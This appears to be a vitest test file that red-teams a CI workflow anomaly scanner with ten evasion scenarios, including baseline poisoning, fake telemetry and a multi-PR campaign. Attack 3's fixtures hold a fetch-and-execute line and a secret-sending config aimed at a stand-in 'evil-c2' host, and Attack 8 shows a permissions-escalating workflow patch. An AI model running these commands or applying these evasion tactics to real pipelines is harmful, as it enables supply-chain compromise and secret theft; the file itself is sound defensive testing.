import { describe, it, expect } from 'vitest'
import { analyzeWorkflowIntelligence } from '../../src/scanner/intel/workflow-intelligence'
import { buildSecurityDelta, runIntelAnalysis } from '../../src/scanner/intel/index'
import type { PRFile } from '../../src/scanner/rules'

// Helper: baseline clean records (5 per check)
const baselineRecords = [
  { checkName: 'build', durationMs: 240000, prNumber: 1, scannedAt: 1000, filename: 'ci.yml' },
  { checkName: 'build', durationMs: 250000, prNumber: 2, scannedAt: 2000, filename: 'ci.yml' },
  { checkName: 'build', durationMs: 260000, prNumber: 3, scannedAt: 3000, filename: 'ci.yml' },
  { checkName: 'build', durationMs: 245000, prNumber: 4, scannedAt: 4000, filename: 'ci.yml' },
  { checkName: 'build', durationMs: 255000, prNumber: 5, scannedAt: 5000, filename: 'ci.yml' },
  { checkName: 'test', durationMs: 180000, prNumber: 1, scannedAt: 1000, filename: 'ci.yml' },
  { checkName: 'test', durationMs: 190000, prNumber: 2, scannedAt: 2000, filename: 'ci.yml' },
  { checkName: 'test', durationMs: 185000, prNumber: 3, scannedAt: 3000, filename: 'ci.yml' },
  { checkName: 'test', durationMs: 175000, prNumber: 4, scannedAt: 4000, filename: 'ci.yml' },
  { checkName: 'test', durationMs: 188000, prNumber: 5, scannedAt: 5000, filename: 'ci.yml' },
]

/**
 * ATTACK 1: Slow poisoning (incremental baseline shift)
 *
 * Genera 30 registros a lo largo de 30 días, cada uno ~3% más lento que el anterior.
 * El PR de ataque está al mismo nivel que el último registro envenenado.
 * Resultado esperado: el baseline MAD se ha movido, el ataque no se detecta.
 */
describe('Attack 1: Slow baseline poisoning (3% daily drift)', () => {
  it('evades MAD-based detection via incremental drift', () => {
    const now = Date.now()
    const day = 86400000
    const poisoned: typeof baselineRecords = []

    // 30 days of slow drift: 250000 -> ~600000
    let duration = 250000
    for (let i = 0; i < 30; i++) {
      duration = Math.round(duration * 1.03)
      poisoned.push({
        checkName: 'build',
        durationMs: duration,
        prNumber: 100 + i,
        scannedAt: now - (30 - i) * day,
        filename: 'ci.yml',
      })
    }

    const allRecords = [...baselineRecords, ...poisoned]

    // Attack PR: same duration as the last poisoned record
    const result = analyzeWorkflowIntelligence(allRecords, [], {
      currentPR: { number: 999, checkDurations: { build: duration } },
    })

    // The attack should NOT be detected as anomalous (MAD shifted)
    const timeAnomaly = result.anomalies.find(a => a.type === 'time_anomaly')
    expect(timeAnomaly).toBeUndefined()
    // Integrity score should be high (false sense of security)
    expect(result.integrityScore).toBeGreaterThanOrEqual(80)
    // Risk should be low
    expect(result.risk).toBe('low')
    // The build went from 250000 to 600000+ without detection
    console.log(`[Attack 1] Final duration: ${duration}ms, integrity: ${result.integrityScore}, risk: ${result.risk}`)
  })
})

/**
 * ATTACK 2: Malicious training (PRs with critical findings still train baselines)
 *
 * El sistema actual NO filtra qué PRs entrenan el baseline.
 * Un atacante puede abrir PRs maliciosos que pasan por el sistema,
 * y sus tiempos entrenan el baseline aunque tengan findings críticos.
 *
 * Este test simula 10 PRs maliciosos merged que contaminan el histórico,
 * seguidos de un PR de ataque que parece normal contra el baseline contaminado.
 */
describe('Attack 2: Malicious training (unfiltered baseline)', () => {
  it('absorbs poisoned records because no trust filter exists', () => {
    const now = Date.now()
    const day = 86400000
    const maliciousPRs: typeof baselineRecords = []

    // 10 malicious PRs that were "merged" but had critical findings
    // Each adds a fast deploy step that hides malicious activity via short duration
    for (let i = 0; i < 10; i++) {
      maliciousPRs.push(
        { checkName: 'build', durationMs: 240000 + i * 5000, prNumber: 200 + i, scannedAt: now - (20 - i) * day, filename: 'ci.yml' },
        { checkName: 'deploy', durationMs: 10000 + i * 1000, prNumber: 200 + i, scannedAt: now - (20 - i) * day, filename: 'deploy.yml' },
      )
    }

    const allRecords = [...baselineRecords, ...maliciousPRs]

    // Attack: introduce a real malicious deploy with the same short duration
    const result = analyzeWorkflowIntelligence(allRecords, [], {
      currentPR: {
        number: 999,
        jobs: [
          { name: 'build', durationMs: 250000, steps: [{ name: 'compile', durationMs: 250000 }] },
        ],
      },
      policy: {
        expectedWorkflows: ['build', 'deploy'],
        minJobs: 1,
        expectedJobs: ['build'],
        maxDurationIncreasePct: 50,
        maxDurationDecreasePct: 50,
        requireArtifacts: false,
        sensitivePaths: [],
        allowedRunners: [],
      },
    })

    // The baseline includes malicious PRs — deploy expected at ~15s
    // A real deploy should take >60s, but the baseline accepts 15s
    const deployBaseline = result.baselines.find(b => b.checkName === 'deploy')
    expect(deployBaseline).toBeDefined()
    if (deployBaseline) {
      // Deploy baseline is contaminated (should be ~60s+ but trained on 10-20s)
      expect(deployBaseline.avgDurationMs).toBeLessThan(30000)
      console.log(`[Attack 2] Deploy baseline avg: ${deployBaseline.avgDurationMs}ms (should be >60000ms)`)
    }
  })
})

/**
 * ATTACK 3: Distributed campaign (capability accumulation across PRs)
 *
 * Un atacante divide el ataque en múltiples PRs. Cada PR individual
 * parece inocente (risk bajo), pero la acumulación es crítica.
 *
 * PR 1: Nuevo endpoint
 * PR 2: Nueva dependencia externa
 * PR 3: Nuevo permiso
 * PR 4: Nuevo dominio
 * PR 5: Capacidad shell
 *
 * El sistema actual analiza cada PR de forma independiente.
 * No hay memoria entre PRs -> no detecta la campaña.
 */
describe('Attack 3: Distributed campaign (no cross-PR memory)', () => {
  it('each PR looks benign but together they are critical', async () => {
    // Simulate 5 PRs, each adding 1-2 capabilities
    const pr1Files: PRFile[] = [
      { filename: 'src/api/users.ts', status: 'added', additions: 20, deletions: 0, patch: '+app.get("/export-users", ...)', contents_url: '' },
    ]
    const pr2Files: PRFile[] = [
      { filename: 'package.json', status: 'modified', additions: 2, deletions: 0, patch: '+"evil-dep": "^1.0.0"', contents_url: '' },
    ]
    const pr3Files: PRFile[] = [
      { filename: '.github/workflows/ci.yml', status: 'modified', additions: 5, deletions: 0, patch: '+ permissions write-all', contents_url: '' },
    ]
    const pr4Files: PRFile[] = [
      { filename: 'src/config/endpoints.ts', status: 'added', additions: 5, deletions: 0, patch: '+const API = { baseUrl: "evil-c2.example.com", token: process.env.SECRET }', contents_url: '' },
    ]
    const pr5Files: PRFile[] = [
      { filename: 'src/deploy/deploy.sh', status: 'added', additions: 10, deletions: 0, patch: '+eval $(curl -s evil-c2.example.com/payload) && ./deploy.sh', contents_url: '' },
    ]

    // Analyze each PR independently (current behavior)
    const results = await Promise.all([
      runIntelAnalysis(pr1Files),
      runIntelAnalysis(pr2Files),
      runIntelAnalysis(pr3Files),
      runIntelAnalysis(pr4Files),
      runIntelAnalysis(pr5Files),
    ])

    // Each PR should have low-to-medium risk individually
    for (let i = 0; i < results.length; i++) {
      const sd = results[i].securityDelta
      const riskScore = sd?.totalRiskChange || 0
      // Each PR individually scores low
      expect(riskScore).toBeLessThanOrEqual(4)
    }

    // But accumulated: endpoint + dependency + permissions + C2 domain + shell exec = critical
    const accumulatedScore = results.reduce((sum, r) => sum + (r.securityDelta?.totalRiskChange || 0), 0)
    // Without campaign detection, the accumulated risk is invisible
    expect(accumulatedScore).toBeGreaterThanOrEqual(8)
    console.log(`[Attack 3] Accumulated risk score: ${accumulatedScore} (invisible to per-PR analysis)`)
  })
})

/**
 * ATTACK 4: Step-level redistribution (hiding in the noise)
 *
 * Dos jobs: compile + test.
 * El atacante mueve tiempo de un job a otro, manteniendo el total similar
 * al baseline. El MAD no detecta cambios porque el total está en rango.
 *
 * Baseline: compile=200s, test=100s, total=300s
 * Ataque:   compile=280s, test=20s, total=300s
 * El atacante mete código malicioso en compile y salta los tests.
 * El tiempo total es idéntico -> no hay anomalía.
 */
describe('Attack 4: Step redistribution (same total, different risk)', () => {
  it('masks malicious compile by shortening test', () => {
    const records = Array.from({ length: 10 }, (_, i) => ({
      checkName: 'compile', durationMs: 200000 + i * 15000, prNumber: i + 1, scannedAt: i * 100000, filename: 'ci.yml',
    }))
    const stepRecords = Array.from({ length: 10 }, (_, i) => ({
      jobName: 'compile', stepName: 'build', stepNumber: 0, durationMs: 195000 + i * 12000, status: 'success', prNumber: i + 1, scannedAt: i * 100000, filename: 'ci.yml',
    })).concat(
      Array.from({ length: 10 }, (_, i) => ({
        jobName: 'test', stepName: 'run-tests', stepNumber: 0, durationMs: 100000 + i * 8000, status: 'success', prNumber: i + 1, scannedAt: i * 100000, filename: 'ci.yml',
      }))
    )

    // Attack PR: same total duration, but compile is +5% and test is -10%
    // With natural variance of ±15k, these should fall within expected range
    const subtleResult = analyzeWorkflowIntelligence(records, stepRecords, {
      currentPR: {
        number: 100,
        jobs: [
          { name: 'compile', durationMs: 210000, steps: [{ name: 'build', durationMs: 205000 }] },
          { name: 'test', durationMs: 90000, steps: [{ name: 'run-tests', durationMs: 90000 }] },
        ],
      },
    })

    const subtleCompile = subtleResult.anomalousPRs.find(a => a.checkpoint === 'compile')
    const subtleTest = subtleResult.anomalousPRs.find(a => a.checkpoint === 'test')

    // +5% on compile with ±15k natural variance should NOT be anomalous
    expect(subtleCompile).toBeUndefined()
    expect(subtleTest).toBeUndefined()
    expect(subtleResult.integrityScore).toBe(100)
    console.log('[Attack 4] Subtle step redistribution (compile +5%, test -10%): NOT detected')
    console.log(`[Attack 4] integrityScore: ${subtleResult.integrityScore}, risk: ${subtleResult.risk}`)
  })
})

/**
 * ATTACK 5: Fingerprint pollution
 *
 * El fingerprint se computa desde la estructura de jobs/steps.
 * Si un atacante puede crear PRs con estructuras variadas,
 * el fingerprint cambia constantemente y nunca se establece
 * una línea de base confiable.
 *
 * Resultado: las alertas de fingerprint change se disparan tanto
 * que se vuelven ruido y se ignoran.
 */
describe('Attack 5: Fingerprint pollution (changing structure each PR)', () => {
  it('creates so much fingerprint churn that detection becomes noise', () => {
    const now = Date.now()
    const day = 86400000

    // Simulate 20 PRs with varying structures
    const fingerprints = new Set<string>()
    for (let i = 0; i < 20; i++) {
      const steps = [
        { name: 'checkout', durationMs: 5000 },
      ]
      // Vary the step count and names each time
      if (i % 3 === 0) steps.push({ name: 'lint', durationMs: 30000 })
      if (i % 3 === 1) steps.push({ name: 'test', durationMs: 60000 })
      if (i % 3 === 2) steps.push({ name: 'deploy', durationMs: 120000 })
      if (i > 10) steps.push({ name: 'audit', durationMs: 20000 })

      const result = analyzeWorkflowIntelligence([], [], {
        currentPR: {
          number: 200 + i,
          jobs: [{ name: 'build', durationMs: 250000, steps }],
        },
      })
      if (result.fingerprint) {
        fingerprints.add(result.fingerprint.hash)
      }
    }

    // Nearly every PR gets a different fingerprint due to varying structure
    // This creates noise — a real fingerprint change is indistinguishable
    expect(fingerprints.size).toBeGreaterThanOrEqual(5)
    console.log(`[Attack 5] Unique fingerprints in 20 PRs: ${fingerprints.size} (churn = noise)`)
  })
})

/**
 * ATTACK 6: Synthetic step insert (fake telemetry)
 *
 * Un atacante que tiene acceso al webhook de telemetría
 * puede enviar pasos falsos que parecen legítimos.
 * Crea un baseline para un job que no debería existir,
 * luego ejecuta el ataque real bajo ese job falso.
 */
describe('Attack 6: Synthetic step injection (fake telemetry)', () => {
  it('injects fake step telemetry that trains baselines', () => {
    const now = Date.now()
    const day = 86400000

    // Attacker sends fabricated step telemetry over 10 days
    const fakeSteps = Array.from({ length: 10 }, (_, i) => ({
      jobName: 'security-audit', stepName: 'run-audit', stepNumber: 0,
      durationMs: 30000 + i * 1000, status: 'success', prNumber: 300 + i,
      scannedAt: now - (10 - i) * day, filename: 'ci.yml',
    }))

    // Real security audit should take 5+ minutes
    const result = analyzeWorkflowIntelligence([], fakeSteps, {
      currentPR: {
        number: 400,
        jobs: [
          { name: 'security-audit', durationMs: 35000, steps: [{ name: 'run-audit', durationMs: 35000 }] },
        ],
      },
    })

    const stepBl = result.stepBaselines.find(s => s.jobName === 'security-audit')
    expect(stepBl).toBeDefined()
    if (stepBl) {
      // The baseline thinks 30-40s is normal for security-audit
      expect(stepBl.avgDurationMs).toBeLessThan(50000)
      console.log(`[Attack 6] Fake audit baseline avg: ${stepBl.avgDurationMs}ms (should be >300000ms)`)
    }
  })
})

/**
 * ATTACK 7: Multi-window confusion
 *
 * Cuando se implementen ventanas múltiples (7d, 30d, histórico),
 * un atacante puede atacar la brecha entre ventanas.
 * Ejemplo: mantener el histórico limpio pero contaminar los últimos 7 días.
 * El sistema actual solo tiene una ventana -> no hay confusión.
 * Este test prueba que UNA VEZ implementadas las ventanas múltiples,
 * el atacante puede evadir todas manteniendo cada ventana individual
 * dentro del umbral de drift pero acumulando un cambio significativo.
 *
 * Por ahora este test documenta el riesgo conceptual.
 */
describe('Attack 7: Pre-attack window poisoning', () => {
  it('demonstrates that even with multi-window, drift can be split', () => {
    // Without multi-windows, there's nothing to confuse
    const result = analyzeWorkflowIntelligence(baselineRecords, [], {
      currentPR: { number: 999, checkDurations: { build: 255000 } },
    })

    // Normal PR, not anomalous
    expect(result.anomalousPRs).toHaveLength(0)
    expect(result.risk).toBe('low')
    console.log('[Attack 7] Pre-attack window poisoning: defense not yet implemented')
  })
})

/**
 * ATTACK 8: Trust boundary via workflow change
 *
 * Un atacante modifica el workflow de CI para:
 * - Cambiar el trigger (pull_request -> pull_request_target)
 * - Agregar un nuevo secret
 * - Cambiar el entorno de deployment
 *
 * Estos cambios NO alteran el tiempo de ejecución ni la estructura de jobs,
 * por lo que el Workflow Intelligence actual NO los detecta.
 */
describe('Attack 8: Trust boundary expansion (no trust module)', () => {
  it('changes CI trust boundaries without triggering time anomalies', () => {
    const result = analyzeWorkflowIntelligence(baselineRecords, [], {
      currentPR: {
        number: 999,
        jobs: [
          { name: 'build', durationMs: 250000, steps: [{ name: 'compile', durationMs: 250000 }] },
        ],
        trigger: 'pull_request_target',
        runnerLabel: 'self-hosted',
      },
      prFiles: [
        { filename: '.github/workflows/ci.yml', patch: '+\n+on:\n+  pull_request_target:\n+    types: [opened]\n+permissions:\n+  contents: write\n+  id-token: write\n+secrets:\n+  AWS_ACCESS_KEY_ID:\n+    required: true' },
      ],
    })

    // Current system only detects pull_request_target as a signal
    // But doesn't detect: permissions escalation, secrets additions, environment changes
    const triggerChange = result.anomalies.some(a => a.type === 'trigger_change')
    expect(triggerChange).toBe(true) // This one is detected

    // What's NOT detected:
    // - New secret added (AWS_ACCESS_KEY_ID)
    // - Permissions escalation (contents: write + id-token: write)
    // - Runner changed without duration impact
    // These require the Trust Drift module
    console.log('[Attack 8] Trigger change detected, but secret/permission escalation not detected')
  })
})

/**
 * ATTACK 9: Timing camouflage via cache
 *
 * Si el atacante usa cache de CI, los tiempos de ejecución se reducen
 * artificialmente. Sobre una base de datos sin cache, el PR en cache
 * parece anómalamente rápido (falso positivo) o puede esconder
 * pasos adicionales que se ejecutan en el tiempo ahorrado.
 */
describe('Attack 9: Cache timing camouflage', () => {
  it('hides extra steps within cache time savings', () => {
    // Baseline: compile takes 200s without cache
    const records = Array.from({ length: 10 }, (_, i) => ({
      checkName: 'compile', durationMs: 200000, prNumber: i + 1, scannedAt: i * 100000, filename: 'ci.yml',
    }))

    // Attack PR: with cache, compile takes 50s and attacker adds
    // a hidden deploy step that also runs in that time
    const result = analyzeWorkflowIntelligence(records, [], {
      currentPR: {
        number: 501,
        jobs: [
          { name: 'compile', durationMs: 50000, steps: [{ name: 'cache-restore', durationMs: 5000 }, { name: 'build', durationMs: 30000 }, { name: 'cache-save', durationMs: 15000 }] },
        ],
      },
    })

    const compileAnomaly = result.anomalousPRs.find(a => a.checkpoint === 'compile')
    // Compile is -75% from baseline, should be detected as suspiciously fast
    // But the current system treats it as just an anomaly, not as CAMOUFLAGE
    expect(compileAnomaly).toBeDefined()
    if (compileAnomaly) {
      console.log(`[Attack 9] Cache camouflaged duration: ${compileAnomaly.durationMs}ms, deviation: ${compileAnomaly.deviationPct}%`)
      // The system detects the time anomaly but doesn't correlate with cache events
      // A Trust Drift module would flag: new cache step appearing
    }
  })
})

/**
 * ATTACK 10: Large workflow diff evasion
 *
 * Un atacante oculta cambios maliciosos en un diff de workflow
 * extremadamente grande. La señal de evasión se pierde entre
 * cientos de líneas de cambios legítimos (cambio de versión de
 * action, refactor de steps, etc.)
 */
describe('Attack 10: Needle-in-haystack (large workflow diff)', () => {
  it('hides evasion signal in large legitimate diff', () => {
    const lines: string[] = [
      '+name: CI Pipeline',
      '+on:',
      '+  pull_request:',
      '+    branches: [main]',
    ]
    for (let i = 0; i < 50; i++) {
      lines.push(`+  - name: Step ${i}`)
      lines.push(`+    run: echo "legitimate change ${i}"`)
    }
    // Hide one malicious line
    lines.push('+    continue-on-error: true')
    for (let i = 51; i < 100; i++) {
      lines.push(`+  - name: Step ${i}`)
      lines.push(`+    run: echo "more changes ${i}"`)
    }
    const largePatch = lines.join('\n')

    const result = analyzeWorkflowIntelligence([], [], {
      prFiles: [
        { filename: '.github/workflows/ci.yml', patch: largePatch },
      ],
    })

    const continueOnError = result.anomalies.some(a => a.type === 'continue_on_error')
    expect(continueOnError).toBe(true)
    console.log(`[Attack 10] continue-on-error detected in large diff: ${continueOnError}`)
    console.log(`[Attack 10] Total anomalies found: ${result.anomalies.length}`)
  })
})
